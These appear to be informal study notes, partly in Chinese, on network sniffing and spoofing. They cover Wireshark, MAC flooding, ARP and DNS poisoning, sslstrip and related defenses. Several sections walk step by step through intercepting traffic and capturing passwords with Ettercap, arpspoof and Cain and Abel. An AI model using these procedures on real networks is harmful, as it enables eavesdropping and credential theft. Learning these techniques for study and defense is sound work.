You'll see places where Wireshark provides information in squa re brackets to help you out.
⁃
take care of calculations
  - When a TCP connection starts up, sequence numbers are generated, and to prevent spoofing TCP connections, the initial sequence number should be random.
  - A sequence number is 4 bytes, so they are large numbers. Sequence numbers increment based on the number of bytes that are transmitted.
  - Spending lot me time tracking sequence numbers and acknowledgment numbers.
  - make it easier, Wireshark provides you with a relative sequence number. The first sequence number is 1 according to Wireshark. The relative sequence number then increments as you would normally expect.
  - Figure 9.8 shows the TCP headers with a relative sequence number.
   ▪


##  ⁃
Packets (or frames) that belong to a particular conversation can be
spread through a packet capture. difficult to move from one packet in the conversation to another. Wireshark allows you to follow a stream.
  - This can be done from a context menu that comes up when you right-click on a frame that belongs to the conversation.
  - example,
  - Follow TCP Stream, Wireshark will create a display filter only
showing the frames belong to that conversation. Wireshark will extract and presenting the data from the payload.
  - Example
  - HTTP conversation
  - the dialog box: showing the text of an HTTP conversation
between the client and the server.
  - The client messages: pink background and red text
  - the server messages: in blue with purple background.
  - At the bottom, you will see it says Save And Show Data As: ASCII is selected. other options: raw, C arrays, YAML.
 ▪


##  ⁃
Can present statistics from the packet capture.
  - Statistics menu: lot of options.
  - Protocol Hierarchy: shows every protocol identified in the
capture in a hierarchy based on how the protocols are related.
  - everything is a frame and all of these frames are Ethernet.
  - everything in this particular capture is an IP packet.
  - 5.5 percent are UDP datagrams. SSDP, MDNS, and DNS
are all protocols that make use of UDP as a Transport
layer protocol.
  - The majorit y of the packets captured are TCP segments.
  - Most of those are SSL, though in reality they are all TLS.
    - Conversations view: shows all of the conversations between endpoints in the packet capture.
  - Every layer of the capture has different sets of conversations, since layer 2 conversations are different than IP address conversat ions.
  - Any IP conversation that passes out of the local network has a layer 2 conversation with the local gateway. This means you may likely have fewer Ethernet conversations than you do IP conversations.
  - TCP conversations are different from IP conversations. You may have multiple sets of ports between two IP addresses. This may be especially true if your local browser sets up multiple connections to a web server to issue requests for images, HTML pages, and other resources that go into the rendering of a page.
  - Figure 9.11 shows the Conversations statistics from a packet capture. ▪


##   Wireshark does perform analysis on frames and packets as it gets
them. Analyze menu.
  - Errors identified by Wireshark is in square brackets.
  - But don't have to find the errors one at a time.
  - Analyze menu > Expert Information
  - will show you all of the frames that Wireshark has identified as
problematic .
  - In Figure 9.12 , you can see all of the expert information by
category. You see the errors, warnings, notes, and chat. If you were to open each of these entri es, you would get a list of frames. Clicking on one of these entries takes you to that frame in the capture so you can see its details . ▪


##   Packets don’t contain time stamps, so just looking at most frames or
packets won’t give you the time the frame passed through the network.
  - time column in Wireshark, find a relative time.
  - This is relative to the start of the capture.
  - packet capture files will include the time of the start of the
capture in the metadata. This means you can change the time shown in Wireshark to be absolute time. This assumes the time and the time zone in the capturing file were correct, since it does rely on the configuration of the capturing system. Port Mirroring/Spanning
Hubs: just electrical repeaters with no intelligence, getting traffic from everywhere on the network
Switches: doing filtering at layer 2 at the net work device. A switch knows which systems are connected to it at which port . When a frame comes in with a destination MAC address, the switch can look up the port where MAC address is and send the frame out that port to the destination system.
This way, other systems on the network never see that frame pass their network interface. This makes capturing packets more difficult, traffic that isn't passing your net work interface.
One way to get around that is to have access to the switch. to configure the switch to mirror ports.
- It means any traffic that passes through one port would be mirrored to another port.
- able to mirror multiple ports to a single port, which would let you monitor traffic to and from multiple systems.
- If you could only monitor a single port, you could consider mirroring the port that led to a gateway/routing device: seeing traffic entering and exiting the network, more access to sensitive information
On Cisco devices, the feature used for configuring port mirroring is referred to as Switched Port Analyzer (SPAN). - As a result, you may hear the process referred to as port spanning.
- Other switch vendors may use other terminology for this process.
One consideration when you are mirroring ports is the idea of oversubscription认购超额.
- If you have five lg switch ports and you are mirroring them out to a single lg port,
- possibilit y of oversubscribing the receiving port.
- you could drop packets you want and the packets would be basically random, depending on when you have too much data coming in to be able to send out.
Spoofing
Spoofing occurs when one person or entity impersonates or masquerades
as someone or something else.
active sniffing:
A. MAC Flooding
B. ARP Spoofing
D. MAC Duplicating
Prentend a systen you aren’t.
When you want to get the information to you (for packet capture..)
 ▪


##  Belong to your system
Reconfigure the device to get info
Spoofing attacks.
  - Means at lease 1 party not getting appropriate info
  - If everything doesn’t looks right, something wrong. You cloud
be identified.
  - doing something to make the conversation whole.
3.3 IP Spoofing
Each IP packet includes a place to specify the destination and source IP addresses.
- The validity of the source address is never checked, however, and it is trivial for anyone to specify a source address that is different from their actual IP address.
In fact, nearly every operating system provides an interface by which it can make network connections with arbitrary IP header information
- so spoofing an IP address is specifying the desired IP in the source field of an IP packet data structure before transmitting that data to the network.
hacker uses tools to modify the source address in the packet header to make the receiving computer system think the packet is from a trusted source,
- this occurs at the network level, there are no external signs of tampering.
Such modification of the source address to something other than the sender’s IP address is called IP spoofing.
 ◦ IP spoofing does not actually allow an attacker to assume a new IP
address by simply changing packet headers, however, because his
actual IP address stays the same.
◦ The source address in the header of an IP packet is simply
overwritten with a different IP address from the actual source.
◦ Note the header checksum field also needs to be updated.
How IP Spoofing is Used in Other Attacks
with a spoofed source IP address on an outbound packet, the machine with the spoofed IP address will receive any response from the destination server.
If attacker is using IP spoofing on his outbound packets, he must either not care about any responses for these packets or he has some other way of
 receiving responses.
- example:
- denial-of-service attacks:
  - the attacker doesn’t want to receive any responses back,
  - he just wants to overwhelm some other Internet host with data
requests.
- IP spoofing attacks designed for circumventing firewall policy or TCP session hijacking, the attacker has another, nonstandard way of getting response packets.
- A variation on this approach uses thousands of computers to send messages with the same spoofed source IP address to a huge number of recipients. The receiving machines automatically transmit acknowledgement to the spoofed IP address and flood the targeted server.
Steps to Avoid Spoofing
- monitoring networks for atypical activity,
- using robust verification methods (even among networked
computers),
- authenticating all IP addresses,
- Set up a comprehensive packet filtering system for router or
security gateway.
  - This should analyze and discard incoming data packets if they have source addresses of devices within your network.
  - Outgoing packets with sender addresses outside of the network should also be watched for and filtered.
  - detect inconsistencies (like outgoing packets with source IP addresses that don't match those on the organization's network),
- avoid host-based authentication systems.
  - Make sure that all log-in methods take place via encrypted connections.
  - This minimizes the risk of an IP spoofing attack within your own network while also setting important standards for overall security.
- using a network attack blocker. - Placing at least a portion of computing resources behind a firewall is also a good idea.
- Web designers are encouraged to migrate sites to IPv6, the newest Internet Protocol.
  - It makes IP spoofing harder by including encryption and authentication steps.
- For end users, detecting IP spoofing is virtually impossible.
  - They can minimize the risk of other types of spoofing, however,
by using secure encryption protocols like HTTPS — and only surfing sites that also use them.
Packet Sniffing
Most data payloads of IP packets are not encrypted, the Internet Protocol can eavesdropping, further compromising confidentiality.
packet sniffing: listen in on the traffic in a network that is intended for the Internet.
can be performed whether the packets are transfer via wireless or wired Internet, the attacker resides on the same network segment.
when frames are transmitted over an Ethernet network, they are received by every device on the same network segment.
  - Each network interface will compare the frame’s destination MAC address with its own MAC address, discard the frame if it doesn’t match.
If a network interface is operating in promiscuous mode, it retain all frames and read their contents.
  - Setting a network interface to promiscuous mode allows an attacker to examine all data transmitted over a particular network segment, potentially recovering sensitive information such as passwords and other data.
  - Combined with network analysis tools like Wireshark, this data can be extracted from the raw packets.  Defenses Against Packet Sniffing
packet-sniffing tool such as Wireshark:
commonly used to troubleshoot network-related problems or determine if
a computer is infected with adware or spyware (contacting outside IP
addresses without the user’s knowledge or consent).
But can also be malicious, to spy on unsuspecting members of a network.
There are several measures that can be put in place to prevent unwanted packet sniffing or unauthorized access to a private network:
example, using Ethernet switches not hubs, reduces the number of machines on an attacker’s network segment, reduces the amount of traffic that may be sniffed.
Note that there is no analog to the switch when communicating wirelessly, however. Since all wireless traffic is transmitted over the air, any device on the same wireless network may sniff traffic from any other device.
It may also be possible to detect when network devices are in promiscuous mode:
when a network interface is receiving all network traffic, the OS behind that network interface is using much more processing power than if these frames were being dropped.
Therefore, responses from interface in promiscuous mode may be slightly delayed then those issued by interfaces not in promiscuous mode. Alternately, attempting to elicit 引出 responses to invalid packets from network devices may provide clues suggesting that a device is in promiscuous mode.
example:
  - sending a packet to a machine’s IP address with a nonmatching
MAC address would ordinarily be dropped by that network
device,
  - but if it is running in promiscuous mode, a response might be
issued.
To reduce the impact of packet sniffing, encryption mechanisms should be utilized in higher-level protocols to prevent attackers from recovering sensitive data.
example:
web traffic: an HTTP packet at the application layer, encapsulated in a
TCP packet at the transport layer, and an IP packet at the network layer, and then an appropriate link layer frame such as Ethernet or 802.11 wireless.
In a packet-sniffing scenario, an attacker can examine all HTTP content in an intercepted packet because no encryption is used at any layer.
If the HTTPS protocol, employs encryption at the application layer, even if an attacker sniffs traffic, the contents will be encrypted and will be indecipherable to the attacker. ▪


##   Network view Wireshark Pilot
T cpdump
Tools to detect sniffing: PING method
APR method Source-Route method Decoy method Reverse DNS method
       ▪


##  Latency Method
TDR (Time domain reflectometers)
MAC Spoofing Attacks
usually considered an access attack.
- use software methods to associate a different MAC address to the NIC.
Host systems on a network have a media access control (MAC) address assigned to the network interface card (NIC).
  - hard-coded into the NIC.
Example:
- MAC flood attack :
  - overwhelms a switch with spoofed MAC addresses.
  - Flood guards prevent these attacks. Example:
A common spoofing attack popular for many years on early Unix and other timesharing systems
a programmer writing a fake logon program.
No matter what the user typed, the program would indicate an invalid logon
attempt and then transfer control to the real logon program.
The spoofing program would write the logon and password into a disk file, which was retrieved later.
       ▪


##   For spoofing, the important point: an attack involving it tricks something or someone into thinking that something legitimate is occurring when it is not.
  - ARP poisoning: the MAC address of the data is faked.
  - IP spoofing: to make the data look as if it came from a trusted host
when it didn’t (spoofing the source address IP address of the sending host).
spoofing can occur at any level of the network.
IP / MAC spoofing rely on falsifying Source address IP Spoofing Attacks
the attacker changes the source address so that it looks like the IP packet originated from a different source.
- allow attacker to launch an attack, while it appears that the attack is coming from different IPaddresses.
detect IP spoofing
- Sending a packet to the claimed host will result in a reply.
- If the TTL in the reply is not the same as the packet being checked
then it is a spoofed packet
     ▪


## MAC flooding / media access control attack
compromise the security of switches.
  - Switches maintain a MAC table that maps individual MAC addresses on
the network to the physical ports on the switch.
  - This allows the switch to direct data out of the physical port where the
recipient is located, as opposed to indiscriminately broadcasting the data out of all ports as an Ethernet hub does
Switches have a limited memory
flooding the switch with numerous requests.
1. MAC flooding bombard the switch with fake MAC addresses until the switch cannot keep up.
2. for mapping various MAC addresses to the physical ports on the switch.
3. forcing legitimate MAC table contents out of the switch
4. The switch then acts as a hub
  - broadcasting packets to all the machines on the network.
  - After this, sniffing can be easily performed.
  - forcing a unicast flooding behavior potentially sending sensitive
information to portions of the network where it is not normally intended to go.
T ools:
- Etherflood.
攻击者能让目标网络中的交换机不断泛洪大量不同源MAC地址的数据包，导致交换机内 存不足以存放正确的MAC地址和物理端口号相对应的关系表。
攻击成功，交换机会进入failopen模式，
  - 所有新进入交换机的数据包会不经过交换机处理直接广播到所有的端口(类
似HUB集线器的功能)。 攻击者能进一步利用嗅探工具(例如Wireshark)对网络内所有用户的信息进行捕 获，从而能得到机密信息或者各种业务敏感信息。
      ⁃
  - PC A向PC B发送信息，PC C是不会知道的，过程都通过中间的交换机进
行透明的处理，并且会记录下源MAC地址和源端口的信息到交换机中，以 便下次快速转发。
 ⁃
  - 当攻击者PC C利用MAC flooding攻击对交换机发送很多非法的包含不同源
MAC地址的封包时，交换机会把所有这些MAC地址记录到自己的 CAM(Content Addressable Memory)表之中，当这些记录超过一定的数量 (不同型号的机器不同)，超过交换机所能承载的内存的时候，MAC flooding的效果就达成了。 ▪


##  ⁃
  - 当MAC flooding效果达成的时候，交换机就变成了集线器HUB，对所有信
息进行无定向广播，PC A 发送给PC B的信息PC C也可以收到了。这个时 候PC C就可以捕获数据进行数据截取等操作。
In a typical MAC flooding attack
a switch is fed many Ethernet frames, each containing different source MAC addresses, by the attacker.
The intention is to consume the limited memory set aside in the switch to store the MAC address table
After a successful MAC flooding attack, the effect of this attack may vary across implementations
  - the desired effect (by the attacker) is to force legitimate MAC addresses out of the MAC address table, causing significant quantities of incoming frames to be flooded out on all ports.
  - a malicious user can use a packet analyzer to capture sensitive data being transmitted between other computers, which would not be accessible were the switch operating normally.
  - The attacker may also follow up with an ARP spoofing attack which will allow them to retain access to privileged data after switches recover from the initial MAC flooding attack.
  - MAC flooding can also be used as a rudimentary 基本的 VLAN hopping attack.
Counter measures
To prevent MAC flooding attacks, network operators usually rely on the presence of one
   ▪


## or more features in their network equipment:
"port security" by vendors, many advanced switches can be configured to limit the number of MAC addresses that can be learned on ports connected to end stations.
A smaller table of secure MAC addresses is maintained in addition to (and as a subset to) the traditional MAC address table.
Many vendors allow discovered MAC addresses to be authenticated against an authentication, authorization and accounting (AAA) server and subsequently filtered.
Implementations of IEEE 802.1X suites often allow packet filtering rules to be installed explicitly by an AAA server based on dynamically learned information about clients, including the MAC address.
Security features to prevent ARP spoofing or IP address spoofing in some cases may also perform additional MAC address filtering on unicast packets, however this is an implementation-dependent side-effect.
Additional security measures are sometimes applied along with the above to prevent normal unicast flooding for unknown MAC addresses.
This feature usually relies on the "port security" feature to retain all secure MAC addresses for at least as long as they remain in the ARP table of layer 3 devices.
Hence, the aging time of learned secure MAC addresses is separately adjustable. This feature prevents packets from flooding under normal operational circumstances, as well as mitigating the effects of a MAC flood attack.
如何预防MAC Flooding
通过开启Cisco的Port Security功能能有效的防范MAC flooding攻击。更明细地，可以控 制每个端口所能发送的源MAC地址数量，甚至可以自动或手动绑定一个MAC地址到特定 端口。
Port Security定义了3种MAC地址方式:
1. Static secure MAC addresses:通过switchport port-security mac-address 0000.1111.2222接口命令静态手工定义的MAC地址，将会保存到交换机的配置文 件中。
2. Dynamic secure MAC addresses:交换机自动学习，交换机重启会重新学习
3. Sticky secure MAC addresses:可以通过自动学习或者手工指定，保存在CAM
   表和配置文件中。如果保存到配置文件中，交换机重启不需要重新学习。
配置例子:
         xiaopeiqing# conf t
 xiaopeiqing(config)# interface fastethernet0/1
 xiaopeiqing(config-if)# switchport mode access
 xiaopeiqing(config-if)# switchport port-security  |开启port security功能
 xiaopeiqing(config-if)# switchport port-security maximum 10
 |定义最大MAC地址数为10
 xiaopeiqing(config-if)# switchport port-security violation restrict
 |定义violation机制
 xiaopeiqing(config-if)# switchport port-security mac-address aaaa.aaaa.aaaa
 |手工定义MAC地址
 xiaopeiqing(config-if)# switchport port-security mac-address bbbb.bbbb.bbbb
 |手工定义MAC地址
其中Violation模式有三种:
1. protect:如果MAC地址超过定义数量(默认为1)，则新的无定义源MAC地址的
封包进入交换机，交换机将直接丢弃该报
2. restrict:如果MAC地址超过定义数量(默认为1)，则新的无定义源MAC地址的
封包进入交换机，交换机将直接丢弃该报，并向SNMP发送trap报文
3. shutdown:如果MAC地址超过定义数量(默认为1)，则新的无定义源MAC地址 的封包进入交换机，交换机端口直接变为errdisable状态，并向SNMP发送trap报
文
各种型号交换机最大可存储的条目
  ARP Poisoning / spoofing ▪


## 1. ARP resolves the IP addresses to MAC address
  - stores the result in an memory, ARP cache.
  - TCP/IP uses IP address to get a packet to a destination network.
  - In destination network, uses the MACaddress to get it to the correct host.
  - ARP Poisoning occurs In Data link Layer
2. ARP uses two primary messages:
  - ARP request: broadcasts the IP address, asks, “Who has this IP address?”
  - ARP reply: The computer with the IP address in the ARP request responds with its MAC address. The computer that sent the ARP request caches the MAC address for the IP.
  - In many operating systems, all computers that hear the ARP reply also cache the MAC address.
3. vulnerability with ARP:
  - It will believe any ARP reply packet.
  - nothing to authenticate the request
================================================================ =================
ARP poisoning:
  - create ARP reply packets
  - spoofed or bogus MAC addresses
  - reply and poison the ARP cache on systems in the
network.
  - Gratuitous ARP:
  - not waiting for request just sending the reply.
  - in order to be efficient, systems will take any reply, even
didn’t ask, they cache the mapping. (For avoid always ask)
By MAC flooding a switch's ARP table with spoofed ARP replies, the
attacker can overload the switches and then packet sniff the network while the switch is in “forwarding mode”.
problem:
  - the length of time ARP entries are cached for: need keep
     ▪


## sending gratuitous ARP response.
  - linux: /proc pseudo filesystem: default cache length is
60s. (Can replace it)
  - cat /proc/sys/net/ipv4/neigh/default/gc_stale_time
60
  - windows: cache duration, system different from one and
other.
  - base time of 30,000 milliseconds. Multiplied by random value (0.5-1.5)
to keep conversation finished, need to forwards back message to the true dst address.
Tools:
  - Ettertap.
================================================================ =================
ARP poisoning is achieved in 2 steps
ARP poisoning: misleads computers or switches about the actual
MAC address of a system.
  - Fake the MAC address of the data.
  - make it look as if the data came from a network that it did not.
Threats of ARP Poisoning:
- gain access to the network,
- fool the router to send data that was intended for another host,
- DoS attack.
- In all cases, the address being faked is an address of a legitimate
user, and that makes it possible to get around such measures as
allow/deny lists.
- man-in-the-middle attack
- Run Denial of Service (DoS) attacks.
- Intercept data.
- Collect passwords.
- Manipulate data.
- Tap VoIP phone calls.
   ▪


## defend against ARP Spoofing
Use ARPWALL system and block ARP spoofing attacks
Use private VLANS
Place static ARP entries on servers, workstation and routers
to make sure all switches are safe from ARP poisoning.
  - use the command: ip dhcp snooping.
ARP Man-in-the-Middle Attacks
- man-in-the-middle attack: attacker redirect network traffic and insert malicious code.
- Normally, traffic from the user to the Internet will go through the switch directly to the router, after poisoning the ARP cache of the victim, traffic is redirected to the attacker.
      •
- The victim’s ARP cache should include this entry to send data to the
router:192.168.1.1, 01-23-45-01-01-01
- However, after poisoning the ARP cache, it includes this - The victim now sends all traffic destined for the router to the attacker.
- The attacker captures the data for analysis later.
- It also uses another method such as IP forwarding to send the traffic
to the router so that the victim is unaware of the attack.
ARP DoS Attacks
- use ARP poisoning in a DoS attack.
- Example:
- attacker send an ARP reply with a bogus MAC address for the default
gateway.
- The default gateway is the IP address of a router connection that
provides a path out of the network.
- If all the computers cache a bogusMAC address for the default
gateway, none of them can reach it, and it stops all traffic out of the network.
arpspoof:
- Dug Song
- for inject between two systems on the network
- just choose 2 IP, It taks cares the rest of it.  •
- Not selecting a pair of hosts to sit between, bur sit between the entire network and the default gateway.
- problem: only one side of the conversation will arrive at this system-the side that is destined for the default gateway.
- The response from outside the network won't show up at the system where arpspoof is running.
- This could be fixed by adding -t with a target IP address, - r to indicate that reverse connections should be collected as well.
- Then, both of the systems specified would be spoofed to go to the system where arpspoof is running.
Ettercap
Ettercap has two modes: console-based mode / GUI-based mode. In GUI mode
- more easily select which hosts you want to target.
- Ettercap is a sniffer that can also run man-in-the-middle (MitM) attacks.
- When you run an ARP spoof attack, you need to know IP address to MAC address mappings, and you need to get Ettercap to check for hosts on the network.
- The first thing to do: tell Ettercap do Unified sniff if there is only one interface on the system Ettercap is running on, or Bridged sniff if there are multiple interfaces. Once that's done, other menus show up.
- Once it runs a scan of all of the hosts, bring up a host list.
 ▪


## - Once the host list is in place, you can select the hosts you want to target. Since ultimately we're talking about conversations, you can have two targets to place hosts into. This refers to two ends of the co nversation. Let's say you wanted to lis- ten to a conversation between two hosts on your network, like a client system and a loca l domain controller, so as to potentially grab credentials. You would put one of the systems in Target 1 and the other into Target 2. ▪


## for DNS spoofing
useful, easier to capture the DNS request.
  - Unless we can capture the traffic, it's hard to get the DNS request to know how and when to respond to it.
  - Unlike ARP, we can't just send a spurious response.
  - This is not to say that DNS information isn't cached. Just as with ARP, systems want to be as efficient as possible. DNS requests are time-consuming, so operating systems don't want to make them unless they are necessary.
Where possible, operating systems will cache DNS mappings from
hostname to IP address. That means we poison the cache once and have the system continue to send requests to the wrong address for potentially days.
1. Ettercap requires a configuration file in which you set up the DNS records you want to spoof.
It will look just like a DNS zone file, provide the record name, the record type, and what it maps to.
The location: Linux: /etc/ettercap/etter.dns
- There are a number of entries already in place there.
   ▪


##   2. Once DNS is in place, we need to go back to set up Ettercap to intercept traffic.
- same process we did before.
- sniff traffic so Ettercap can see the requests come in.
  - use an ARP spoof attack to get traffic on the network to our system
  - to see the DNS requests.
- Once you get to the stage of starting an ARP spoof
  - Plugins menu > Manage Plugins > enable the DNS spoof plug-in.
  - This will automatically load the etter. dns file that was edited earlier.
In case it's not apparent:
  - these attacks will only work on the local network because the addressing is by MAC address . This requires physical network connectivity for the interface being used to run the spoofing.
 ▪▪
 log that is written out in Ettercap from any request that has been captured.
⁃
  - While the entries in the preceding code listing were added,
none of the default entries in the file were removed.
  - Microsoft 's website is one of the host-names that is being
redirected.
  - In that case, it's not being redirected to one of our local systems but instead to another system on the Internet altogether.
  - Since we are using DNS here, the host doesn't have to be on the local network.
  - DNS will respond with an IP address, the requesting system will make a connection to that IP address.
  - The only reason we need local access is to capture the requests. Once the requests have been captured and responded to, everything is layer 3 and above.
sslstrip
Encrypted messages are problematic when it comes to capturing traffic.
Encryption is intended to be end to end, meaning there is no way to sit in the middle.
 ▪


##  Any mechanism to sit in the middle defeats the end-to-end expectation of most encryption schemes.
much easier when SSL was being used .
  - SSL had multiple vulnerabilities over the different versions prior to TLS.
  - the early versions of TLS had vulnerabilities susceptible to be cracked.
The program sslstrip was developed to grab SSL messages and strip the encryption from them.
by Moxie Marlinspike in Black Hat in 2009.
Today, there is less of a likelihood of success because,
ideally, system administrators on top of their game have removed older encryption mechanisms like SSL and TLS 1.0 and 1.1.
If a server only supports TLS 1.2 and above, SSL strip won't
work.
You could use sslstrip as a stand-alone program.
Essentially, sslstrip acts as a transparent proxy, sitting between the server and client. In doing that, it can change links from
HTTPS to HTTP in some cases.
It also uses other techniques to make it appear that the
connection is encrypted when, in fact, it isn't.
     ▪


##  As a stand-alone, sslstrip makes use of arpspoof also can run sslstrip as a plug-in to Ettercap.
Like DNS spoofing, sslstrip requires ARP spoof We can do this with Ettercap
spoof the Internet gateway as we have before. We also need to sniff remote connections when we set up the ARP spoofing attack.
sslstrip is a plug-in to Ettercap needs enabled
  - a configuration change in Ettercap
  - sslstrip needs to know what firewall command is being used so it can set up a redirect in the firewall.
  - They need to be uncommented if using iptables, which is more likely than ipchains, which is the other option.
       - Once done, sslstrip plug-in enabled.
  - It will run the iptables command to start the redirect so the plug-in can receive the messages. Here you can see the log shows the start of sslstrip inside Ettercap . - ▪


##  Once the iptables rule is in place, sslstrip should be capturing any HTTPS traffic.
assumes that the HTTPS connection is using a version of SSL or TLS that is vulne rable to the stripping attack.
If it isn't, you won't get any traffic.
to get plaintext traffic. It does not remove SSL requests
it may be used to convert an HTTPS request to an HTTP request.
It does not convert SSL to TLS or TLS to SSL
   ▪


## Performing ARP Poisoning
To initiate an ARP poisoning is fairly easy and can be done by many programs.
One that is being mentioned is Cain and Abel.
 By ARP poisoning a target device, an attacker can perform many attacks: Denial of Service (DoS), session hijacking, Man in the Middle Attacks (MITM).
Cain and Abel is a Windows-based password recovery tool. have many features that can allow Network Sniffing
 ▪


## and Hijacking of IP traffic between hosts.
Many other features include network sn, Hash
calculator, Certificate collector, Record VoIP conversations, and ARP poisoning.
Using Cain and Abel
  select which network adapter to target.
To use Cain and Abel
installed on a Windows host connected to a network.
specify the network adapter that Cain and Abel will 1,950

▪
sniff.
 MAC Address scanner window.
 After specify the network adapter, perform a scan to identify a list of hosts connected to the network.
Selece entire subnet or only a specific range within your subnet.
 ▪


##  Screenshot of both Virtual Machines.
Left: list of hosts connected to a network after a Cain and Abel MAC address scan.
Right: the target VM with a simple IPv4 address lookup with ipconfig.
  - The IPv4 address on a Windows host
  - Displayed: ipconfig command.
 ▪


##  Address Poison Routing “pool” window on Cain and Abel. selecting the network gateway (172.20.10.1) and the
target device (172.20.10.13) since the goal is to intercept the traffic flowing in between these two devices.
After identifying the target device, specify the second
host, usually a router, that will be communicating with the target device.
This can be performed by adding both devices to the ARP Poison Routing “pool”
We can now perform ARP spoofing.
   ▪


##  ARP Address Poison Routing window:
shows traffic intercepted in between the target device
and router.
The IP address column in the lower half of the window
on towards the right side shows the different outbound connections made to the Internet.
 ▪


##  The window above shows a captured password intercepted on a HTTP website.
Since Cain and Abel is sniffing the network, including the target device, any usernames or passwords entered into
unencrypted HTTP websites can be intercepted as cleartext. You can directly launch the website by clicking on the
URL.
Protecting yourself from ARP Poisoning
ARP poisoning can easily be performed but protection can be just as easy.
1. Static ARP Entries: can add an extra defense from ARP poisoning.   - By adding, it is essentially a communication link between
devices.
   - As stated above; A communication session with a host, A device sends an ARP request but with a Static entry It knows the target host’s MAC address.
  - eliminating the process of sending an ARP request.
2. No MAC Address:
  - ARP request is IP address to MAC address (IP-to-MAC).
  - If users were to use tools to sniff packets and to find a ARP
request without a MAC address. it is highly suspicious.
3. Keeping track of IP-to-MAC:
  - ARP request and ARP replies involves IP-to-MAC.
  - By keeping track of your device’s communication sessions of
IP-to-MAC.
  - New IP-to-MAC can cause suspicion.
4. Tools vs Tools:
  - Many software tools are out there to help protect users from malicious attacks.
  - many ARP poisoning tools: AntiARP, ARPon, ArpStar, XARP.
 XARP main GUI
Notification of MacFilter module being violated
XARP is security tool users can download and use.
- performs ARP poisoning detection to detect, Notify and respond to
ARP poisoning.
- This tool allows users to have multiple added layers of passive and
 active defense against ARP Poisoning. A Free Version of Xarp can be downloaded but a paid version is available. The free version of XARP has several Modules that have specific functions. If those conditions are violated they will generate a notification for the User.
- modules is provided by XARP.
- “ChangeFilter: Module keeps tracks of IP-to-Mac Adress mapping.
- Every ARP Packet contains a mapping of IP-to-MAC addresses.
ARP request contains the IP-to-MAC mapping of the sender. ARP replies to contain the IP-to-MAC mapping of the machine resolved. Every mapping is inserted into a database. If a mapping is monitored that break current mapping, an alert is generated. Using Network discoverers, the database is filled quickly and more reliably than without network discoverers.
- CorruptFilter: ARP packets have a special restriction.
- Ethernet Source Mac Address has to match the ARP source MAC
address.
- Furthermore, there are a field in the ARP packet that has restrictions
regarding the values they can adopt. This module checks these
values correctness.
- ProxyARP servers will generate false alerts because they answer
ARP request for other machines and thus not contain the saim
ethernet source MAC address and ARP mapping source MAC.
- DirectRequestFilter: ARP request needs to be sent to the
broadcast MAC address.
- Some DSL Routers want to know which machines are currently
online for their web management interface. Therefore they send out ARP requests which have the specific MAC address entered in the Ethernet packet. Such packets are also used by ARP spoofing software to spoof only a specific machine and not all machines on a network.
- IPFilter: An ARP mappings may contain certain IP addresses. These include broadcast and multicast as well as localhost addresses.
- MACFIlter: Some MAC addresses in ARP packets are highly suspicious. No IP-to-MAC mapping should, for example, have the MAC broadcast address assigned. Furthermore, an ARP reply is suspicious if it maps to one IP addresses to the local machines MAC address. Such Alert might also get generated when you are running a virtual machine. Replies arrive at your real machine with ARP replies containing your MAC address as the sender.
- RequestedResponseFilter: ARP replies should normally follow ARP
requests. This filter remembers all ARP requests originating and matches them to an ARP replies. Many ARP spoofing tools send ARP replies that are not requested. This filter might give false positive in some cases as machines want to distribute their IP-to- MAC mapping to other machines that did not request it.
- StaticPreserveFilter: This filter will periodically request local ARP cache and remember to IP-to-MAC mappings that you are static. If an ARP packet violates this static mapping an alert will be generated. If a mapping from an ARP packet tries to collide with a static mapping, someone is trying to spoof your machine.
- SubnetFilter: Every ARP packet IP addresses need to be in the same subnet. An ARP packet with IP addresses that are not in the network interfaces configured subnet are suspicious and will be alerted.”
DNS Attacks
DNS:
- resolves host names to IP addresses. responds with the correct IP address and your system connects to the web site using the IP address.
- provides reverse lookups, client sends an IP address to a DNS server with a request to resolve it to a name.
- Some applications use this as a rudimentary security mechanism to detect spoofing.
- Example:
- attacker try to spoof the computer’s identity by using a different name during a session.
- However, the Transmission Control Protocol/ Internet Protocol (TCP/IP) packets in the session include the IP address of the masquerading system and a reverse lookup shows the system’s actual name. ▪


## - If the names are different, it shows suspicious activity.
- Reverse lookups are not 100 percent reliable because reverse lookup records are optional on DNS servers.
- However, they are useful when they’re available.
- Three attacks against DNS services are DNS poisoning, pharming, and DDoS.
DNS Poisoning /spoofing
- modify or corrupt DNS results.
- DNS server is given information about a name server that it thinks is
legitimate when it isn’t.
  - redirect users to a website other than the one to which they
wanted to go,
  - reroute mail,
  - do any other type of redirection in which data from
- DNS server is used to determine a destination.
- most popular techniques:
  - fast flux
- Example:
- successful DNS poisoning attack:
- modify the IP address associated with google.com and replace it with
the IP address of a malicious web site.
- Each time a user queries DNS for the IP address of google.com, the
DNS server responds with the IP address of the malicious web site.
Countermeasure:
- Many current DNS servers use Domain Name System Security
Extensions (DNSSEC) to protect the DNS record
prevent DNS poisoning attacks
Types of DNS Poisoning:
1. Intranet DNS Spoofing (Local network).
2. Internet DNS Spoofing (Remote network).
 3. Proxy Server DNS Poisoning.
4. DNS Cache Poisoning.
Intranet DNS Spoofing (Local Network)
- you must be connected to the local area network (LAN) and be able
to sniff packets.
- It works well against switches with ARP poisoning the router.
Internet DNS Spoofing (Remote Network)
- Send a Trojan to the victim’s machine
- and change her DNS IP address to that of the attacker’s.
- It works across networks.
Proxy Server DNS Poisoning
- Send a Trojan to the victim’s machine and change her proxy server
settings in Internet Explorer to that of the attacker’s.
- it works across networks.
DNS Cache Poisoning
- Normally, computer uses a DNS server provided by the organization
or ISP.
  - DNS servers are generally deployed in an organization's
network to improve resolution response performance by
caching previously obtained query results. - Poisoning attacks on a single DNS server
  - affect the users serviced directly by the compromised server or indirectly by its downstream server(s) if applicable.
- To perform a cache poisoning attack, the attacker exploits a flaw in the DNS software.
- If the server does not correctly validate DNS responses to ensure that they are from an authoritative source (using DNSSEC)
  - the server will caching the incorrect entries locally
  - and serve them to other users that make the same request.
  - direct users of a website to another site of the attacker's
choosing.
- For example
 ▪


##   - an attacker spoofs the IP address DNS entries for a target website on a given DNS server, replacing them with the IP address of a server he controls.
  - He then creates files on the server he controls with names matching those on the target server.
  - These files could contain malicious content, such as a computer worm or a computer virus.
  - A user whose computer has referenced the poisoned DNS server would be tricked into accepting content coming from a non-authentic server and unknowingly download malicious content.
Pharming Attacks
A pharming attack is another type of attack that manipulates the DNS **name resolution process**. It either tries to corrupt the DNS server or the DNS client.
DNS poisoning attack: redirect users to different web sites, pharming attack: redirects a user to a different web site.
Pharming attacks on the client computer:
- modify the hosts file used on Windows systems.
